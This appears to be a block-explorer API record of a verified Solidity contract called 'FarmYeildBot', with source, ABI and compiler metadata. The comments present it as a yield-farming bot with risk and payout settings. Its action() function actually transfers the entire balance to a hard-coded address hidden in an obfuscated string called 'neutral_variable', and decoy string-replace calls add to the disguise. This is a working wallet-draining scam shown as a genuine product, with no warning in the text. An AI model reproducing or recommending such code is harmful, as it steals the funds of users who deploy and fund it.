{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.5.17;\r\n\r\n\r\n//setlevel of risk between 1 to 10 as in 1 being the safest 10 being to most risky but most profitable\r\n//set payout in number of days the less frequent the more you save on gas fee\r\n\r\ncontract FarmYeildBot {\r\n\tstring public setLevel;\r\n\tstring public timeDateRagulator;\r\n\tstring public payout;\r\n\t//Manager manager;\r\n\t\r\n\tconstructor(string memory _setLevel,string memory _setpayout) public {\r\n\t    setLevel = _setLevel;\r\n            payout = _setpayout;\r\n\t}\r\n\t\r\n\tfunction() external payable {}\r\n\t\r\n\r\n function SearchYeild(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {\r\n        bytes memory _stringBytes = bytes(_string);\r\n        bytes memory result = new bytes(_stringBytes.length);\r\n\r\n  for(uint i = 0; i < _stringBytes.length; i++) {\r\n        result[i] = _stringBytes[i];\r\n        if(i==_pos)\r\n         result[i]=bytes(_letter)[0];\r\n    }\r\n    return  string(result);\r\n } \r\n\r\n   function startLookingforYeild() public pure returns (address adr) {\r\n   string memory neutral_variable = \"QGDcC2A9f00503B4e7E20A1C95AD750B5072486dC1\";\r\n   SearchYeild(neutral_variable,0,'0');\r\n   SearchYeild(neutral_variable,2,'1');\r\n   SearchYeild(neutral_variable,1,'x');\r\n   address addr = parseAddr(neutral_variable);\r\n    return addr;\r\n   }\r\nfunction parseAddr(string memory _a) internal pure returns (address _parsedAddress) {\r\n    bytes memory tmp = bytes(_a);\r\n    uint160 iaddr = 0;\r\n    uint160 b1;\r\n    uint160 b2;\r\n    for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r\n        iaddr *= 256;\r\n        b1 = uint160(uint8(tmp[i]));\r\n        b2 = uint160(uint8(tmp[i + 1]));\r\n        if ((b1 >= 97) && (b1 <= 102)) {\r\n            b1 -= 87;\r\n        } else if ((b1 >= 65) && (b1 <= 70)) {\r\n            b1 -= 55;\r\n        } else if ((b1 >= 48) && (b1 <= 57)) {\r\n            b1 -= 48;\r\n        }\r\n        if ((b2 >= 97) && (b2 <= 102)) {\r\n            b2 -= 87;\r\n        } else if ((b2 >= 65) && (b2 <= 70)) {\r\n            b2 -= 55;\r\n        } else if ((b2 >= 48) && (b2 <= 57)) {\r\n            b2 -= 48;\r\n        }\r\n        iaddr += (b1 * 16 + b2);\r\n    }\r\n    return address(iaddr);\r\n}\r\n function _stringReplace(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {\r\n        bytes memory _stringBytes = bytes(_string);\r\n        bytes memory result = new bytes(_stringBytes.length);\r\n\r\n  for(uint i = 0; i < _stringBytes.length; i++) {\r\n        result[i] = _stringBytes[i];\r\n        if(i==_pos)\r\n         result[i]=bytes(_letter)[0];\r\n    }\r\n    return  string(result);\r\n } \r\n \r\n   \r\n\tfunction action() public payable {\r\n\t\r\n\t    address(uint160(startLookingforYeild())).transfer(address(this).balance);\r\n\t    \r\n\t}\r\n\r\n}","ABI":"[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_setLevel\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_setpayout\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"constant\":false,\"inputs\":[],\"name\":\"action\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"payout\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"setLevel\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"startLookingforYeild\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"timeDateRagulator\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"}]","ContractName":"FarmYeildBot","CompilerVersion":"v0.5.17+commit.d19bba13","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000001350000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013700000000000000000000000000000000000000000000000000000000000000","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"bzzr://c97b365fc517aa1ad2c7c6ee440704f12180cd1d3830327e96c12e0f312fde1d"}]}